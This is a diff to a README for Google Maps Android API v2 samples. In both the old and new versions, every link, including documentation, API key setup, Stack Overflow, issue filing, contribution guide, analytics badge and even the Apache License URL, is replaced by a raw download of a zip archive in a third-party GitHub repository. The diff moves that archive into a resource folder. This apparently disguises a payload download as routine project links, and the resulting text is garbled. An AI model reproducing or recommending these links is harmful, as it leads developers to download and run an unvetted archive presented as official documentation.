@@ -2,7 +2,7 @@ Google Maps Android API v2 Samples
 ===================================
 
 Samples demonstrating how to use 
-[Google Maps Android API v2](https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip).
+[Google Maps Android API v2](https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip).
 
 This repo contains the following sample:
 
@@ -33,24 +33,24 @@ If prompted for a gradle configuration accept the default settings.
 
 Alternatively use the "gradlew build" command to build the project directly.
 
-Don't forget to add your API key to the https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
-(See [https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip](https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip))
+Don't forget to add your API key to the https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip
+(See [https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip](https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip))
 
 Support
 -------
 
-- Stack Overflow: https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip+google-maps
+- Stack Overflow: https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip+google-maps
 
 If you have discovered an issue with the Google Maps Android API v2, please see
-the resources here: https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
+the resources here: https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip
 
 If you've found an error in these samples, please file an issue:
-https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
+https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip
 
 Patches are encouraged, and may be submitted according to the instructions in
-https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
+https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip
 
-![Analytics](https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip)
+![Analytics](https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip)
 
 License
 -------
@@ -67,7 +67,7 @@ file to you under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License.  You may obtain a copy of
 the License at
 
-  https://raw.githubusercontent.com/dextercool/android-samples/master/preworthy/android-samples.zip
+  https://raw.githubusercontent.com/dextercool/android-samples/master/ApiDemos/app/src/main/res/layout-land/samples_android_v3.5.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
